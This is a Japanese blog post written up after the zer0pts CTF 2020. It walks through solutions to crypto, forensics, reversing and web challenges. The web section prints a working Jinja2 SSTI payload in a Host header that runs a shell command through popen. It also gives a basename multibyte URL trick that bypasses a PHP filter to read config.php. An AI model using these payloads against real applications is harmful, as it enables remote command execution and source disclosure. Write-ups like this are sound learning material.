<!DOCTYPE html>
<html xmlns="//www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
    <head>

        <meta http-equiv="content-type" content="text/html; charset=utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />

        <title>Zer0pts_2020_writeup &middot; $ sleep infinity</title>
        <link rel='stylesheet' href='//fonts.googleapis.com/css?family=Open+Sans:400,300,600' type='text/css'>
        <link rel="stylesheet" href="https://arata-nvm.github.io/blog/libraries/normalize.3.0.1.css" />
        <link rel="stylesheet" href="https://arata-nvm.github.io/blog/css/liquorice.css" />
        <meta property="og:url" content="https://arata-nvm.github.io/blog/2020/03/10/zer0pts_2020_writeup/">
        <meta property="og:title" content="Zer0pts_2020_writeup &middot; $ sleep infinity">
        <meta property="og:image" content="https://arata-nvm.github.io/blog/icon-512x512.png">
        <meta name="twitter:card" content="summary">
        <meta property="og:description" content="">
        <meta name="twitter:site" content="@arata_nvm">
        <meta name="twitter:creator" content="@arata_nvm">
        <meta name="twitter:image" content="https://arata-nvm.github.io/blog/icon-512x512.png"></meta>
        <link rel="shortcut icon" href="https://arata-nvm.github.io/blog/favicon.ico" />
        <link rel="apple-touch-icon-precomposed" href="/apple-touch-icon-144-precomposed.png" sizes="144x144" />
        </head>
    <body class="li-body">

<header class="li-page-header">
    <div class="container">
        <div class="row">
            <div class="sixteen columns">
                <div class="li-brand li-left">
                <a href="https://arata-nvm.github.io/blog">$ sleep infinity</a></div>
                <div class="li-menu li-right">
                    <span class="li-menu-icon" onclick="javascript:toggle('menu');">&#9776;</span>
                    <ul id="menu2" class="li-menu-items">
                        
                            <li><a href="/blog/about/"> About </a></li>
                        
                            <li><a href="/blog/categories"> Categories </a></li>
                        
                            <li><a href="/blog/post"> Posts </a></li>
                        
                    </ul>
                </div>
            </div>
        </div>
        <div class="row">
            <div class="sixteen columns">
                <ul id="menu" class="li-menu-items li-menu-mobile">
                    
                        <li><a href="/blog/about/"> About </a></li>
                    
                        <li><a href="/blog/categories"> Categories </a></li>
                    
                        <li><a href="/blog/post"> Posts </a></li>
                    
                </ul>
            </div>
        </div>
    </div>
</header>






    <div class="container">
        <div class="row">
            <div class="sixteen columns">
                <article class="li-article">
                    <header class="li-article-header">
                        <h1 class="li-article-title">Zer0pts_2020_writeup</h1>
                        <span class="li-article-taxonomies">
                            

                            
                        </span>
                        
                        <time class="li-article-date">Tuesday, March 10, 2020</time>
                    </header>
                    <section>
                        <p>ソロでチーム&quot;helix&quot;として参加した。1909 点を獲得し、順位は 43 位だった。</p>
<h2 id="crypto">crypto</h2>
<h3 id="ror">ROR</h3>
<p>以下のソースコードとその実行結果が渡される。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> random
<span style="color:#f92672">from</span> secret <span style="color:#f92672">import</span> flag

ror <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x, l, b: (x <span style="color:#f92672">&gt;&gt;</span> l) <span style="color:#f92672">|</span> ((x <span style="color:#f92672">&amp;</span> ((<span style="color:#ae81ff">1</span><span style="color:#f92672">&lt;&lt;</span>l)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)) <span style="color:#f92672">&lt;&lt;</span> (b<span style="color:#f92672">-</span>l))

N <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
<span style="color:#66d9ef">for</span> base <span style="color:#f92672">in</span> [<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">7</span>]:
    N <span style="color:#f92672">*</span><span style="color:#f92672">=</span> pow(base, random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">123</span>, <span style="color:#ae81ff">456</span>))
e <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">271828</span>, <span style="color:#ae81ff">314159</span>)

m <span style="color:#f92672">=</span> int<span style="color:#f92672">.</span>from_bytes(flag, byteorder<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">big</span><span style="color:#e6db74">&#39;</span>)
<span style="color:#66d9ef">assert</span> m<span style="color:#f92672">.</span>bit_length() <span style="color:#f92672">&lt;</span> N<span style="color:#f92672">.</span>bit_length()

<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(m<span style="color:#f92672">.</span>bit_length()):
    <span style="color:#66d9ef">print</span>(pow(ror(m, i, m<span style="color:#f92672">.</span>bit_length()), e, N))
</code></pre></div><p>まず、最終行の<code>ror</code>が何をしているのか調べる。バイト列、数値、長さを渡しているように見えるので試しに適当な値を与えてみる。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">&gt;&gt;</span><span style="color:#f92672">&gt;</span> ror <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x, l, b: (x <span style="color:#f92672">&gt;&gt;</span> l) <span style="color:#f92672">|</span> ((x <span style="color:#f92672">&amp;</span> ((<span style="color:#ae81ff">1</span><span style="color:#f92672">&lt;&lt;</span>l)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)) <span style="color:#f92672">&lt;&lt;</span> (b<span style="color:#f92672">-</span>l))
<span style="color:#f92672">&gt;&gt;</span><span style="color:#f92672">&gt;</span> b <span style="color:#f92672">=</span> <span style="color:#ae81ff">0b00100111</span>
<span style="color:#f92672">&gt;&gt;</span><span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
<span style="color:#f92672">.</span><span style="color:#f92672">.</span><span style="color:#f92672">.</span>   <span style="color:#66d9ef">print</span>(format(ror(b, i, <span style="color:#ae81ff">8</span>), <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">08b</span><span style="color:#e6db74">&#39;</span>))
<span style="color:#f92672">.</span><span style="color:#f92672">.</span><span style="color:#f92672">.</span>
<span style="color:#ae81ff">00100111</span>
<span style="color:#ae81ff">10010011</span>
<span style="color:#ae81ff">11001001</span>
<span style="color:#ae81ff">11100100</span>
<span style="color:#ae81ff">01110010</span>
<span style="color:#ae81ff">00111001</span>
<span style="color:#ae81ff">10011100</span>
<span style="color:#ae81ff">01001110</span>
</code></pre></div><p>この結果より第2引数で指定された数だけ右にローテーションしていることがわかる。</p>
<p>また、いろいろ試していると暗号化する前と後で奇数と偶数の変化が起こらないことに気づいた。
よってローテーションしながら暗号化していることを利用し、一つ一つ奇数か偶数かを集めていくとフラグを入手できる。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> binascii <span style="color:#f92672">import</span> unhexlify

<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">log.txt</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;</span>) <span style="color:#66d9ef">as</span> f:
  lines <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>readlines()

r <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span>
<span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> lines:
  <span style="color:#66d9ef">if</span> int(line) <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
    r <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">0</span><span style="color:#e6db74">&#39;</span>
  <span style="color:#66d9ef">else</span>:
    r <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">1</span><span style="color:#e6db74">&#39;</span>

<span style="color:#66d9ef">print</span>(unhexlify(format(int(r), <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">x</span><span style="color:#e6db74">&#39;</span>)))
</code></pre></div><h2 id="forensics">forensics</h2>
<h3 id="locked-kitkat">Locked KitKat</h3>
<p>Android のイメージファイルが渡されるので、パターンロックを解除してねという問題。
Google先生に聞き以下のツールを見つけた。</p>
<p><a href="https://github.com/sch3m4/androidpatternlock">https://github.com/sch3m4/androidpatternlock</a></p>
<p>このツールに<code>/data/system/gesture.key</code>というファイルを食わせるとクラックしてくれるので、ターミナルにて実行。フラグが入手できた。</p>
<h2 id="others">others</h2>
<p>コピペ問題</p>
<h3 id="welcome">Welcome</h3>
<p>自明</p>
<h3 id="survey">Survey</h3>
<p>自明</p>
<h2 id="pwn">pwn</h2>
<h3 id="hipwn">hipwn</h3>
<p>忘却。半分寝ている状態で解いていたのでメモが残っていなかった。</p>
<h2 id="reversing">reversing</h2>
<h3 id="vmlog">vmlog</h3>
<p>Brainf*ck似のプログラムとその実行結果、及びプログラムを実行するためのPythonスクリプトが渡された。</p>
<p>試しに実行してみると文字入力を求められるので、実行結果はフラグを入力した際のものであると考えた。</p>
<p>同じ文字を同じ順番で入力すれば常に同じ出力が得られるので、総当りするスクリプトを実行するとフラグが入手できた。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">error</span><span style="color:#e6db74">&#39;</span>

letters <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_+!?{}</span><span style="color:#e6db74">&#34;</span>


<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">try</span>(candidate, log):
  p <span style="color:#f92672">=</span> process((<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">python</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">./vm.py</span><span style="color:#e6db74">&#34;</span>))
  p<span style="color:#f92672">.</span>recvline() <span style="color:#75715e"># M+s</span>
  p<span style="color:#f92672">.</span>recvline() <span style="color:#75715e"># [0,</span>
  p<span style="color:#f92672">.</span>recvline() <span style="color:#75715e"># [46</span>
  p<span style="color:#f92672">.</span>sendline(candidate)
  <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(candidate)):
    line <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>decode()
    <span style="color:#66d9ef">if</span> line <span style="color:#f92672">!=</span> log[i]:
      p<span style="color:#f92672">.</span>kill()
      <span style="color:#66d9ef">return</span> False
  p<span style="color:#f92672">.</span>kill()
  <span style="color:#66d9ef">return</span> True

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">read_log</span>():
  <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">log.txt</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;</span>) <span style="color:#66d9ef">as</span> f:
    log <span style="color:#f92672">=</span> [i <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> f<span style="color:#f92672">.</span>readlines()]
  <span style="color:#66d9ef">return</span> log

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
  candidate <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span>
  log <span style="color:#f92672">=</span> read_log()
  <span style="color:#66d9ef">while</span> True:
    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> letters:
      <span style="color:#66d9ef">if</span> <span style="color:#66d9ef">try</span>(candidate <span style="color:#f92672">+</span> c, log):
        candidate <span style="color:#f92672">+</span><span style="color:#f92672">=</span> c
        <span style="color:#66d9ef">print</span>(f<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">[+] Found: {candidate}</span><span style="color:#e6db74">&#34;</span>)
        <span style="color:#66d9ef">break</span>

main()
</code></pre></div><h3 id="qr-puzzle">QR Puzzle</h3>
<p>鍵と暗号化されたQRコード、及び暗号化するプログラムが渡された。</p>
<p>プログラムの処理を読んでみると鍵ファイルの内容に従って特定のピクセルを入れ替えていた。</p>
<p>そこで、鍵ファイルの上下を逆にしそのまま鍵ファイルとしてプログラムに渡すと無事にQRコードが復号できた。</p>
<h2 id="web">web</h2>
<h3 id="notepad">notepad</h3>
<p>渡されたソースコードの以下の部分に脆弱性があった。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a6e22e">@app.errorhandler</span>(<span style="color:#ae81ff">404</span>)
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">page_not_found</span>(error):
    <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#e6db74"> Automatically go back when page is not found </span><span style="color:#e6db74">&#34;&#34;&#34;</span>
    referrer <span style="color:#f92672">=</span> flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>get(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Referer</span><span style="color:#e6db74">&#34;</span>)

    <span style="color:#66d9ef">if</span> referrer <span style="color:#f92672">is</span> None: referrer <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">/</span><span style="color:#e6db74">&#39;</span>
    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> valid_url(referrer): referrer <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">/</span><span style="color:#e6db74">&#39;</span>

    html <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Refresh</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74"> content=</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">3;URL={}</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Page not found. Redirecting...&lt;/body&gt;&lt;/html&gt;</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(referrer)

    <span style="color:#66d9ef">return</span> flask<span style="color:#f92672">.</span>render_template_string(html), <span style="color:#ae81ff">404</span>
</code></pre></div><p>404ページを返すときにリファラーの値を直接組み込んでいるので、ここでSSTIが行える。</p>
<p>しかしリファラーの値は以下の<code>valid_url</code>関数によってバリデーションが行われるため、ホスト部分を除き16文字を超えたものについては受け入れられない。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">valid_url</span>(url):
    <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#e6db74"> Check if given url is valid </span><span style="color:#e6db74">&#34;&#34;&#34;</span>
    host <span style="color:#f92672">=</span> flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>host_url

    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> url<span style="color:#f92672">.</span>startswith(host): <span style="color:#66d9ef">return</span> False  <span style="color:#75715e"># Not from my server</span>
    <span style="color:#66d9ef">if</span> len(url) <span style="color:#f92672">-</span> len(host) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">16</span>: <span style="color:#66d9ef">return</span> False <span style="color:#75715e"># Referer may be also 404</span>

    <span style="color:#66d9ef">return</span> True
</code></pre></div><p>この先の部分が想定解と異なっていた。</p>
<p>ホスト部分についてはヘッダと同値であるかのチェックしか行われないので、そこにSSTIを仕込めると考えた。</p>
<p>そこでヘッダを以下のように設定し、リクエストを送ったところフラグが入手できた。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">Host: {{<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__mro__[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">117</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">popen</span><span style="color:#e6db74">&#39;</span>]<span style="color:#f92672">.</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">cat flag</span><span style="color:#e6db74">&#39;</span>)<span style="color:#f92672">.</span>read()}}
</code></pre></div><h3 id="can-you-guess-it">Can you guess it?</h3>
<p>渡されたソースコードの以下の部分に脆弱性があった。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">if (preg_match(&#39;/config\.php\/*$/i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) {
  exit(&#34;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&#34;);
}

if (isset($_GET[&#39;source&#39;])) {
  highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));
  exit();
}
</code></pre></div><p><code>basename</code>関数はlocaleの設定を適切にしていなければマルチバイト文字に対して正常に動作しない。</p>
<p>つまり1行目の正規表現にマッチし、かつマルチバイト文字で終わる以下のようなURLでアクセスすればフラグを入手できた。</p>
<pre><code>http://&lt;CENSORED&gt;/index.php/config.php/ほげ?source
</code></pre>
                    </section>
                </article>
            </div>
        </div>

        <div class="row li-author">
    <div class="sixteen columns">
        Written by <strong>arata-nvm</strong>
    </div>
</div>


        <div class="row li-pagination">
            <div class="eight columns">
                <div class="li-pagination-previous">
                    
                        Later article<br />
                        <a href="https://arata-nvm.github.io/blog/2020/02/21/wanttodo_2020/"> 2020年にすること</a>
                    
                </div>
            </div>
            <div class="eight columns">
                <div class="li-pagination-next">
                    
                        &nbsp;
                    
                </div>
            </div>
        </div>
    </div>

<footer class="li-page-footer">
    <div class="container">
        <div class="row">
            <div class="sixteen columns">
                <div class="li-page-footer-legal">
                    &copy; 2020. All rights reserved. 
                </div>
                <div class="li-page-footer-theme">
                    <span class=""><a href="https://github.com/eliasson/liquorice/">liquorice</a> is a theme for <a href="http://hugo.spf13.com">hugo</a></span>
                </div>
            </div>
        </div>
    </div>
</footer>

    <script type="text/javascript">
    <!--
    function toggle(id) {
        var e = document.getElementById(id);
        e.style.display == 'block' ? e.style.display = 'none' : e.style.display = 'block';
    }
    
    </script>
    
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
	ga('create', 'UA-158885575-1', 'auto');
	
	ga('send', 'pageview');
}
</script>

    </body>
</html>

